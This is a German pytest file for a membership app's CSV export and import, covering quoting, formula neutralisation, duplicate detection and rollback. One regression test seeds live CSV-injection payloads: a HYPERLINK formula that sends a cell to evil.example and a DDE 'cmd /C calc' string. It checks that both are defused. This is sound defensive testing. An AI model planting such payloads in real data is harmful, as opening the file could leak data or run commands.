"""N11 — Reiter Import + Export: Reparaturen aus R-P1-9b-code (Neu A/B).

Quelle: die Befunde des vorausgehenden Reviews zu diesem Paket.

Befunde, die hier festgenagelt werden:

Neu A  CSV-Export quotet korrekt. Vorher baute der Server die Datei mit
       ``";".join(...)`` ohne Anfuehrungszeichen: ein Wert mit Semikolon,
       Anfuehrungszeichen oder Zeilenumbruch (Gruppenname, Adresse)
       verschob Spalten bzw. brach die Zeile.
Neu B  Telefonnummern mit ``+`` (z. B. ``+49 711 123``) werden seit N11b
       (B1) MIT entschaerft: ``+`` ist in Excel ein vollwertiges
       Formelzeichen, eine unentschaerfte Zelle ``+49 …`` wird dort als
       Formel gelesen (Fehler bzw. Zahl statt Nummer). Der Import loest das
       fuehrende ``'`` wieder, damit der Weg Export->Import verlustfrei bleibt.
B1     Formel-Einschleusung ueber Name UND Telefon geschlossen (Ausnahme aus
       Neu B entfaellt). Regressionstest aus der Review-Probe P7.
Import Gleiche Namen ohne E-Mail werden auch INNERHALB der Datei als
       Dublette erkannt (vorher nur E-Mail-Gleichheit).
Import ``bestaetigt`` steht standardmaessig auf 0: Dubletten werden nur
       nach ausdruecklicher Bestaetigung angelegt.
K1     Filter „Alle n“ benutzt ``gesamt_alle`` (ohne Statusfilter)
       — Frontend-Test, hier nur der Serverwert.
K2     Der Export zaehlt nur auf der ersten Seite (``mit_zaehlung``).
K4     Eine von der Schranke abgewiesene Importzeile nennt den Grund.
"""

from __future__ import annotations

import csv
import io
from typing import Any

import pytest


@pytest.fixture
def rollen(monkeypatch):
    """Admin-Rollen fuer die Mitglieder-Endpunkte (Muster test_p1_9_*).

    `admin_hub` bindet `get_roles`/`is_guest` per `from ... import` — dort
    greift ein Patch auf `permissions` allein nicht, deshalb mitpatchen.
    """
    from diakronos_app.api import admin_hub, mitglieder
    from diakronos_app.frappe_compat import permissions

    halt: dict[str, Any] = {"roles": ["Mitgliederadministrator"], "user": "admin@example.org"}
    hole = lambda user=None: list(halt["roles"])  # noqa: E731
    kein_gast = lambda user=None: False  # noqa: E731
    for mod in (permissions, mitglieder, admin_hub):
        if hasattr(mod, "get_roles"):
            monkeypatch.setattr(mod, "get_roles", hole)
        if hasattr(mod, "is_guest"):
            monkeypatch.setattr(mod, "is_guest", kein_gast)
    monkeypatch.setattr(mitglieder, "_is_admin", lambda: True)
    return halt


@pytest.fixture
def sess(patched_db):
    s = patched_db()
    yield s
    s.close()


def _zeilen(csv_text: str, trenner: str = ";") -> list[list[str]]:
    return list(csv.reader(io.StringIO(csv_text), delimiter=trenner))


# ── Neu A: korrektes Quoting ────────────────────────────────────────────────


def test_export_quotet_semikolon_und_zeilenumbruch(client, seed_mitglieder, rollen, sess):
    """Neu A: Werte mit ; " und Zeilenumbruch bleiben EINE Zelle."""
    from diakronos_app.models.diakonos import Mitglied

    sess.add(Mitglied(
        name="M-N11Q", vorname="Chor; Kinder", nachname='Person "Zitat"',
        email="n11q@example.org", status="Mitglied",
    ))
    sess.commit()

    r = client.post(
        "/api/method/mitglieder.exportiere_mitglieder_csv",
        json={"suche": "n11q"},
    )
    assert r.status_code == 200, r.text
    text = r.json()["message"]["csv"]

    gelesen = _zeilen(text)
    assert len(gelesen) == 2, text          # Kopf + eine Datenzeile
    kopf, daten = gelesen
    assert len(kopf) == len(daten) == 3, (kopf, daten)
    # Die Zellen tragen die Originalwerte — nichts rutscht in Nachbarspalten.
    assert daten[0] == 'Chor; Kinder Person "Zitat"', daten


def test_export_zeilenumbruch_in_zelle_bleibt_eine_zeile(client, seed_mitglieder, rollen, sess):
    """Neu A: Ein Zeilenumbruch IM Wert bricht die CSV-Zeile nicht."""
    from diakronos_app.models.diakonos import Mitglied

    sess.add(Mitglied(
        name="M-N11Z", vorname="Zeile", nachname="Umbruch",
        email="n11z@example.org", status="Mitglied", wohnort="Zeile1\nZeile2",
    ))
    sess.commit()

    r = client.post(
        "/api/method/mitglieder.exportiere_mitglieder_csv",
        json={"suche": "n11z", "persoenliche_daten": True},
    )
    assert r.status_code == 200, r.text
    text = r.json()["message"]["csv"]
    gelesen = _zeilen(text)
    assert len(gelesen) == 2, gelesen       # Kopf + EINE Datenzeile
    assert "Zeile1\nZeile2" in gelesen[1]


def test_export_formel_wird_trotz_quoting_entschaerft(client, seed_mitglieder, rollen, sess):
    """Neu A: Das Quoting hebt die Formel-Entschaerfung nicht auf."""
    from diakronos_app.models.diakonos import Mitglied

    sess.add(Mitglied(
        name="M-N11F", vorname="=1+1", nachname='Beispiel; "zwei"',
        email="n11f@example.org", status="Mitglied",
    ))
    sess.commit()

    r = client.post(
        "/api/method/mitglieder.exportiere_mitglieder_csv",
        json={"suche": "n11f"},
    )
    text = r.json()["message"]["csv"]
    zellen = _zeilen(text)[1]
    assert zellen[0].startswith("'="), zellen   # Formel entschaerft
    assert "1+1" in zellen[0]


# ── Neu B / B1: Telefonnummern mit + ────────────────────────────────────────


def test_export_telefonnummer_mit_plus_wird_entschaerft(client, seed_mitglieder, rollen, sess):
    """N11b (B1): '+49 711 123456' bekommt ein fuehrendes '. `+` ist in Excel
    ein Formelzeichen — unentschaerft liest Excel die Zelle als Formel
    (Fehler bzw. Zahl statt Nummer). Das `'` macht sie zu Text; der Import
    loest es wieder (siehe `test_import_loest_entschaerfung_telefon`)."""
    from diakronos_app.models.diakonos import Mitglied

    sess.add(Mitglied(
        name="M-N11T", vorname="Telefon", nachname="Plus",
        email="n11t@example.org", status="Mitglied",
        telefonnummer="+49 711 123456", postleitzahl="70173",
    ))
    sess.commit()

    r = client.post(
        "/api/method/mitglieder.exportiere_mitglieder_csv",
        json={"suche": "n11t", "persoenliche_daten": True},
    )
    assert r.status_code == 200, r.text
    kopf = _zeilen(r.json()["message"]["csv"])[0]
    telefon = _zeilen(r.json()["message"]["csv"])[1][kopf.index("Telefon")]
    assert telefon == "'+49 711 123456", telefon
    # Postleitzahl "70173" bleibt unveraendert (kein Formelzeichen).
    assert _zeilen(r.json()["message"]["csv"])[1][kopf.index("PLZ")] == "70173"


def test_entschaerfung_loesen_mit_und_ohne_leerraum():
    """R-N11b K-a: `_entschaerfung_loesen` loest das ' auch vor Leerraum+Formel."""
    from diakronos_app.api.mitglieder import _csv_zelle, _entschaerfung_loesen

    # Direkter Fall: ' + Formelzeichen.
    assert _entschaerfung_loesen("'=1+1") == "=1+1"
    assert _entschaerfung_loesen("'+49 711") == "+49 711"
    # Leerraum-Fall (K-a): das ' steht VOR dem Leerraum.
    assert _entschaerfung_loesen("' =1+1") == " =1+1"
    assert _entschaerfung_loesen("'\t=SUM(A1)") == "\t=SUM(A1)"
    # Ehrliche Apostroph-Namen bleiben unveraendert.
    assert _entschaerfung_loesen("O'Brien") == "O'Brien"
    assert _entschaerfung_loesen("'Anni") == "'Anni"
    # Roundtrip: Export entschaerft " =1+1" -> Import loest wieder.
    entschaerft = _csv_zelle(" =1+1")
    assert entschaerft == "' =1+1"
    assert _entschaerfung_loesen(entschaerft) == " =1+1"


def test_import_loest_entschaerfung_telefon(client, seed_mitglieder, rollen, sess):
    """N11b (B1) Roundtrip: Export -> Import bleibt verlustfrei — das
    praeventive `'` landet NICHT in den Daten."""
    from diakronos_app.models.diakonos import Mitglied

    sess.add(Mitglied(
        name="M-N11R", vorname="Rund", nachname="Reise",
        email="n11r@example.org", status="Mitglied",
        telefonnummer="+49 711 123456",
    ))
    sess.commit()

    csv_text = "Vorname;Nachname;E-Mail;Telefon\n"
    csv_text += "Rund;Zwei;zwei@example.org;+49 711 123456\n"   # unentschaerft (handgeschrieben)
    csv_text += "Rund;Drei;drei@example.org;'+49 711 999999\n"  # entschaerft (aus dem Export)
    r = client.post(
        "/api/method/mitglieder.import_mitglieder_uebernehmen",
        json={"csv_inhalt": csv_text},
    )
    assert r.status_code == 200, r.text
    assert r.json()["message"]["angelegt"] == 2, r.json()["message"]
    sess.expire_all()
    # Beide Telefonnummern tragen das `+` — nie ein fuehrendes `'`.
    nummern = {m.telefonnummer for m in sess.query(Mitglied).filter(
        Mitglied.nachname.in_(["Zwei", "Drei"])).all()}
    assert nummern == {"+49 711 123456", "+49 711 999999"}, nummern


def test_export_formel_ueber_name_und_telefon_entschaerft(client, seed_mitglieder, rollen, sess):
    """N11b (B1), Review-Probe P7: Formel-/DDE-Payload in Name UND Telefon
    erscheint im Export entschaerft (kein fuehrendes Formelzeichen)."""
    from diakronos_app.models.diakonos import Mitglied

    sess.add(Mitglied(
        name="M-EVIL",
        vorname='+HYPERLINK("https://evil.example/?\"&E2;"Klick")+N("',
        nachname='")', email="evil@example.org", status="Mitglied",
        telefonnummer="+cmd|' /C calc'!A0",
    ))
    sess.commit()

    r = client.post(
        "/api/method/mitglieder.exportiere_mitglieder_csv",
        json={"suche": "evil", "persoenliche_daten": True},
    )
    assert r.status_code == 200, r.text
    zeilen = _zeilen(r.json()["message"]["csv"])
    kopf, evil = zeilen[0], zeilen[1]
    name, tel = evil[kopf.index("Name")], evil[kopf.index("Telefon")]
    assert not name.startswith("+"), name
    assert not tel.startswith("+"), tel
    assert name.startswith("'+HYPERLINK"), name
    assert tel.startswith("'+cmd"), tel


def test_export_entschaerft_weiterhin_echte_formelzeichen(client, seed_mitglieder, rollen, sess):
    """Neu B: An echten Formelzeichen (= - @) aendert sich nichts.

    Zwei Personen, damit jede Zelle GENAU einen Wert traegt (der Testlauf
    legt Daten ohne `full_name` an — zwei Mitglieder in derselben Zeile
    teilen sich sonst eine Spalte, siehe `test_import_dublette_gleicher_name_*`).
    """
    from diakronos_app.models.diakonos import Mitglied

    sess.add(Mitglied(
        name="M-N11G", vorname="-2+3", nachname="Minus",
        email="n11g@example.org", status="Mitglied",
    ))
    sess.add(Mitglied(
        name="M-N11H", vorname="@SUM(A1)", nachname="Klammer",
        email="n11h@example.org", status="Mitglied",
    ))
    sess.commit()

    zeilen = _zeilen(_export(client, suche="n11g"))
    assert len(zeilen) == 2, zeilen
    assert zeilen[1][0] == "'-2+3 Minus", zeilen

    zeilen = _zeilen(_export(client, suche="n11h"))
    assert len(zeilen) == 2, zeilen
    assert zeilen[1][0] == "'@SUM(A1) Klammer", zeilen


def _export(client, suche=""):
    """CSV-Text des Exports holen (Hilfe fuer die Export-Tests)."""
    r = client.post(
        "/api/method/mitglieder.exportiere_mitglieder_csv",
        json={"suche": suche, "persoenliche_daten": False},
    )
    assert r.status_code == 200, r.text
    return r.json()["message"]["csv"]


# ── Import: Dubletten gleicher Name ohne E-Mail innerhalb der Datei ─────────


def test_import_dublette_gleicher_name_ohne_email_in_datei(client, seed_mitglieder, rollen):
    """Operator-Nachtrag: derselbe Name zweimal in der Datei, ohne E-Mail ->
    die zweite Zeile ist eine Dublette (vorher: beide 'neu')."""
    csv_text = (
        "Vorname;Nachname;E-Mail\n"
        "Doppelt;Name;\n"
        "Doppelt;Name;\n"
    )
    r = client.post(
        "/api/method/mitglieder.import_mitglieder_vorschau",
        json={"csv_inhalt": csv_text},
    )
    assert r.status_code == 200, r.text
    msg = r.json()["message"]
    status = [z["status"] for z in msg["zeilen"]]
    assert status == ["neu", "dublette"], msg["zeilen"]
    assert msg["zeilen"][1]["dublette"]["grund"] == "name_in_datei"
    assert msg["zusammenfassung"]["dubletten"] == 1


def test_import_dublette_gleicher_name_ohne_email_im_bestand(client, seed_mitglieder, rollen):
    """Derselbe Name wie im Bestand OHNE E-Mail -> Dublette mit Grund 'name'."""
    csv_text = "Vorname;Nachname\nAnna;Beispiel\n"
    r = client.post(
        "/api/method/mitglieder.import_mitglieder_vorschau",
        json={"csv_inhalt": csv_text},
    )
    msg = r.json()["message"]
    assert msg["zeilen"][0]["status"] == "dublette", msg["zeilen"]
    assert msg["zeilen"][0]["dublette"]["grund"] == "name"


def test_import_dublette_gross_klein_ohne_email(client, seed_mitglieder, rollen):
    """Namen werden ohne Ruecksicht auf Gross/Klein verglichen — und gleiche
    Namen ohne E-Mail auch INNERHALB der Datei erkannt (der Bestand wird hier
    absichtlich nicht befragt: `get_all` vergleicht exakt, das waere ein
    anderes, hier nicht verlangtes Verhalten)."""
    csv_text = "Vorname;Nachname\n  Zwei ;MAL\nzwei;mal\n"
    r = client.post(
        "/api/method/mitglieder.import_mitglieder_vorschau",
        json={"csv_inhalt": csv_text},
    )
    zeilen = r.json()["message"]["zeilen"]
    assert [z["status"] for z in zeilen] == ["neu", "dublette"], zeilen
    assert zeilen[1]["dublette"]["grund"] == "name_in_datei"


# ── Import: bestaetigt standardmaessig 0 ────────────────────────────────────


def test_import_dubletten_ohne_bestaetigung_nicht_angelegt(client, seed_mitglieder, rollen, sess):
    """Operator-Nachtrag: OHNE `bestaetigt` (Standard 0) werden Dubletten bei
    `dubletten_ueberspringen=0` NICHT angelegt — der Aufruf wird abgelehnt."""
    from diakronos_app.models.diakonos import Mitglied

    vorher = sess.query(Mitglied).count()
    r = client.post(
        "/api/method/mitglieder.import_mitglieder_uebernehmen",
        json={"csv_inhalt": "Vorname;Nachname\nAnna;Beispiel\n",
              "dubletten_ueberspringen": False},
    )
    assert r.status_code >= 400, r.text
    sess.expire_all()
    assert sess.query(Mitglied).count() == vorher


def test_import_dubletten_mit_bestaetigung_angelegt(client, seed_mitglieder, rollen, sess):
    """Mit ausdruecklichem `bestaetigt=1` werden sie angelegt."""
    from diakronos_app.models.diakonos import Mitglied

    vorher = sess.query(Mitglied).count()
    r = client.post(
        "/api/method/mitglieder.import_mitglieder_uebernehmen",
        json={"csv_inhalt": "Vorname;Nachname\nAnna;Beispiel\n",
              "dubletten_ueberspringen": False, "bestaetigt": 1},
    )
    assert r.status_code == 200, r.text
    assert r.json()["message"]["angelegt"] == 1
    sess.expire_all()
    assert sess.query(Mitglied).count() == vorher + 1


# ── Statuszaehler serverseitig (Befund 10) ──────────────────────────────────


def test_statuszaehler_zaehlt_alle_nicht_nur_geladene(client, seed_mitglieder, rollen):
    """Befund 10: Die Statuszahlen kommen vom Server ueber ALLE sichtbaren
    Mitglieder, nicht nur ueber die geladene Seite (limit=1)."""
    r = client.post(
        "/api/method/mitglieder.get_mitglieder_liste",
        json={"start": 0, "limit": 1},
    )
    assert r.status_code == 200, r.text
    msg = r.json()["message"]
    assert len(msg["data"]) == 1                 # nur eine Zeile geladen
    assert msg["status_zaehler"]["Mitglied"] == 2, msg["status_zaehler"]
    # AUSTRITT A5/b (B3): Ausgetretene sind in der Grundliste ausgeblendet,
    # also zaehlt der Zaehler sie hier auch nicht. Mit dem Statusfilter
    # „Ausgetreten“ erscheinen sie (siehe naechster Test).
    assert "Ausgetreten" not in msg["status_zaehler"], msg["status_zaehler"]
    assert msg["gesamt_alle"] == 2, msg["gesamt_alle"]


def test_statuszaehler_ignoriert_den_statusfilter(client, seed_mitglieder, rollen):
    """Der Statusfilter darf die Zahlen nicht auf 0 setzen: mit
    `status=Ausgetreten` bleibt die Zahl der Mitglieder sichtbar."""
    r = client.post(
        "/api/method/mitglieder.get_mitglieder_liste",
        json={"status": "Ausgetreten", "start": 0, "limit": 20},
    )
    assert r.status_code == 200, r.text
    msg = r.json()["message"]
    assert msg["total"] == 1
    # Bei gesetztem Statusfilter zaehlt auch der Zaehler wieder die
    # Ausgetretenen — sonst stuende in der Liste „1 von 1“, im Chip „0“.
    assert msg["status_zaehler"]["Mitglied"] == 2, msg["status_zaehler"]
    assert msg["status_zaehler"]["Ausgetreten"] == 1, msg["status_zaehler"]
    assert msg["gesamt_alle"] == 3


# ── K3: Import-Ruecknahme als echte Transaktion ─────────────────────────────


def test_import_ruecknahme_ist_echte_transaktion(client, seed_mitglieder, rollen, sess, monkeypatch):
    """N11b/K3: Der Lauf steht in einem Speicherpunkt (`begin_nested`); bricht
    eine Zeile ab, wird zurueckgerollt — und zwar OHNE den Umweg ueber
    `_delete_doc` (der liess bei einem Prozessabbruch einen halben Import
    stehen)."""
    from diakronos_app.api import mitglieder
    from diakronos_app.models.diakonos import Mitglied

    # `_delete_doc` darf fuer die Ruecknahme nicht mehr benutzt werden.
    aufrufe: list[tuple] = []
    monkeypatch.setattr(
        mitglieder, "_delete_doc",
        lambda *a, **k: aufrufe.append(a),
    )

    echt = mitglieder._create
    n = {"i": 0}

    def kaputt(doctype, werte):
        n["i"] += 1
        if n["i"] == 2:
            raise RuntimeError("DB-Grenze mitten im Lauf")
        return echt(doctype, werte)

    monkeypatch.setattr(mitglieder, "_create", kaputt)

    vorher = sess.query(Mitglied).count()
    r = client.post(
        "/api/method/mitglieder.import_mitglieder_uebernehmen",
        json={"csv_inhalt": "Vorname;Nachname\nA;Eins\nB;Zwei\nC;Drei\n"},
    )
    assert r.status_code >= 400, r.text
    sess.expire_all()
    assert sess.query(Mitglied).count() == vorher, "halber Import blieb stehen"
    # Der Speicherpunkt hat zurueckgerollt; kein nachtraegliches Loeschen.
    assert not any("Mitglied" in a for a in aufrufe), aufrufe


# ── K1/K2/K4-Bezug im Backend erfuellt ──────────────────────────────────────


def test_export_zaehlt_nur_auf_der_ersten_seite(client, seed_mitglieder, rollen, monkeypatch):
    """N11b/K2: Der Export blaettert in 500er-Schritten ab, die Zaehlabfragen
    laufen aber nur EINMAL (erste Seite) — mit `mit_zaehlung=True` auch fuer
    die Folgeseiten waere jede Seite teurer als noetig.

    R-N11b K-b: Die Seitengrenze wird per monkeypatch auf 1 gesetzt, damit der
    Export WIRKLICH ueber mehrere Seiten laeuft. Sonst belegt `all(gesehen)`
    nur, dass der eine Aufruf gezaehlt hat — nicht, dass die Folgeseiten
    `mit_zaehlung=False` bekommen."""
    from diakronos_app.api import mitglieder

    # Drei Mitglieder und Seitengroesse 1 -> mindestens drei Seiten.
    monkeypatch.setattr(mitglieder, "EXPORT_SEITENGROESSE", 1)

    gesehen: list[bool] = []
    echt = mitglieder.get_mitglieder_liste

    def spion(*args, **kwargs):
        gesehen.append(kwargs.get("mit_zaehlung", True))
        return echt(*args, **kwargs)

    monkeypatch.setattr(mitglieder, "get_mitglieder_liste", spion)
    r = client.post("/api/method/mitglieder.exportiere_mitglieder_csv", json={})
    assert r.status_code == 200, r.text
    assert len(gesehen) >= 2, f"nur {len(gesehen)} Seite(n) abgefragt: {gesehen}"
    # Nur der ERSTE Aufruf zaehlt; alle Folgeseiten ueberspringen die Zaehlung.
    assert gesehen[0] is True, gesehen
    assert all(w is False for w in gesehen[1:]), gesehen


def test_liste_ohne_zaehlung_liefert_keine_zahlen(client, seed_mitglieder, rollen):
    """N11b/K2: `mit_zaehlung=False` laesst Count und Statuszaehler weg
    (`total`/`gesamt_alle`/`status_zaehler` leer) — die Folgeseiten des
    Exports brauchen sie nicht."""
    r = client.post(
        "/api/method/mitglieder.get_mitglieder_liste",
        json={"start": 0, "limit": 20, "mit_zaehlung": False},
    )
    assert r.status_code == 200, r.text
    msg = r.json()["message"]
    assert msg["total"] is None, msg
    assert msg["gesamt_alle"] is None, msg
    assert msg["status_zaehler"] == {}, msg
    assert msg["data"], "Datenzeilen muessen trotzdem kommen"


# ── K4: Grund einer abgewiesenen Importzeile ────────────────────────────────


def test_import_nennt_grund_der_schranke(client, seed_mitglieder, rollen, sess):
    """N11b/K4: Verweigert die Schranke eine Zeile (hier: Mitglied mit der
    E-Mail eines System-Manager-Kontos ohne Mitglied), nennt die Meldung den
    Grund — nicht das allgemeine „die Zeile ließ sich nicht speichern“."""
    from diakronos_app.frappe_compat.session import set_user
    from diakronos_app.models.core import HasRole, User

    sess.add(User(name="sm@x.org", email="sm@x.org", full_name="SM", enabled=True))
    sess.add(HasRole(name="HR-sm", parent="sm@x.org", parenttype="User",
                     parentfield="roles", role="System Manager", docstatus=0, idx=1))
    sess.commit()
    set_user("admin@example.org")

    r = client.post(
        "/api/method/mitglieder.import_mitglieder_uebernehmen",
        json={"csv_inhalt": "Vorname;Nachname;E-Mail\nKapern;SM;sm@x.org\n"},
    )
    assert r.status_code >= 400, r.text
    text = r.text
    assert "Zeile" in text, text
    # Der konkrete Grund der Schranke steht mit drin (nicht nur die Sammlung).
    assert "nicht speichern" not in text, text
